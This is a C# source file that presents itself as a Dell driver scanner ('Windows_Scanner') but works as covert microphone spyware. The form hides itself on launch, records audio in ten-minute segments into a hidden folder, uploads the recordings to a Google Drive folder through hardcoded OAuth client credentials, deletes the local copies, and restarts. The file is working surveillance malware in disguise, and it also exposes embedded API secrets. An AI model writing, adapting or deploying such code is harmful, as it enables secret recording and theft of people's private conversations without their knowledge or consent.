using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using Google.Apis.Drive.v3;
using Google.Apis.Drive.v3.Data;
using Google.Apis.Auth.OAuth2;
using Google.Apis.Services;
using System.Collections.Generic;
using System.Threading;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;

namespace Dell_Drivers
{
    public partial class Windows_Scanner : Form
    {
        
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern int record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

        
        public Windows_Scanner()
        {
            InitializeComponent();
            this.Opacity = 0;
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;

            record("open new Type waveaudio Alias recsound", "", 0, 0);            
        }

        private Google.Apis.Drive.v3.DriveService service = new Google.Apis.Drive.v3.DriveService();

        private void createservice()
        {
            string clientid = "33112220271-90jmr0k7ajfptp3fvte99h27b9srcg5o.apps.googleusercontent.com";
            string clientsecret = "ofn4YpoJsGJ2mfOjFlliKvXx";
            var uc = GoogleWebAuthorizationBroker.AuthorizeAsync(new ClientSecrets() { ClientId = clientid, ClientSecret = clientsecret }, new[] { Google.Apis.Drive.v2.DriveService.Scope.Drive }, "user", CancellationToken.None).Result;
            service = new Google.Apis.Drive.v3.DriveService(new BaseClientService.Initializer() { HttpClientInitializer = uc, ApplicationName = "Google Drive VB Dot Net" });
        }

        private void Windows_Scanner_Load(object sender, EventArgs e)
        {            

            try
            {
                DateTime now = DateTime.Now;

                //String fileloc = "C:\\windows\\logs\\telephony\\TempoMic";
                String fileloc = "C:\\Users\\"+global.currentUser+"\\Favorites\\Links\\TempoMic";


                if (!Directory.Exists(fileloc))
                {
                    //Directory.CreateDirectory(fileloc);
                    DirectoryInfo di = Directory.CreateDirectory(fileloc);
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                }

                if (Directory.Exists(fileloc))
                {
                    audio();
                }                
            }
            catch
            {

            }

        }

        private async void audio()
        {

            record("record recsound", "", 0, 0);
            await Task.Delay(TimeSpan.FromMinutes(10));
            //record("save recsound c:\\windows\\logs\\telephony\\TempoMic\\" + DateTime.Now.ToString("ddMMMyyyy_hhmmsstt") + ".wav", "", 0, 0);
            record("save recsound C:\\Users\\" + global.currentUser + "\\Favorites\\Links\\TempoMic\\" + DateTime.Now.ToString("ddMMMyyyy_hhmmsstt") + ".wav", "", 0, 0);

            record("close recsound", "", 0, 0);

            string folderId = global.folderID_G;

            bool connectionStatus = NetworkInterface.GetIsNetworkAvailable();

            if (connectionStatus == true)
            {
                try
                {
                    //string[] myfiles = Directory.GetFiles(@"c:\Windows\Logs\Telephony\TempoMic\");
                    string[] myfiles = Directory.GetFiles("C:\\Users\\" + global.currentUser + "\\Favorites\\Links\\TempoMic\\");


                    if (service.ApplicationName != "Google Drive VB Dot Net")
                        createservice();

                    var fileMetadata = new Google.Apis.Drive.v3.Data.File();
                    //fileMetadata.Name = FileName;
                    fileMetadata.Parents = new List<string>
                {
                    folderId
                };

                    for (int i = 0; i < myfiles.Length; i++)
                    {

                        string[] namebreaker = myfiles[i].Split('\\');
                        string foundName = namebreaker[(namebreaker.Length - 1)];
                        fileMetadata.Name = foundName;

                        Google.Apis.Drive.v3.FilesResource.CreateMediaUpload request;
                        using (var stream = new FileStream(myfiles[i], FileMode.Open))
                        {
                            request = service.Files.Create(fileMetadata, stream, fileMetadata.MimeType);
                            request.Upload();
                        }
                        var file = request.ResponseBody;

                        //return file.Id;
                    }

                    for (int i = 0; i < myfiles.Length; i++)
                    {
                        System.IO.File.Delete(myfiles[i]);
                    }

                    this.Close();
                    GC.Collect();

                }

                catch
                {
                    this.Close();
                    GC.Collect();
                }
            }
                        

            //if (System.Windows.Forms.Application.OpenForms["Form1"] != null)
            //{
            //}
            if (global.audioState == "1")
            {
                (Application.OpenForms["Form1"] as Form1).audioRestart();
            }

            
        }
    }
}

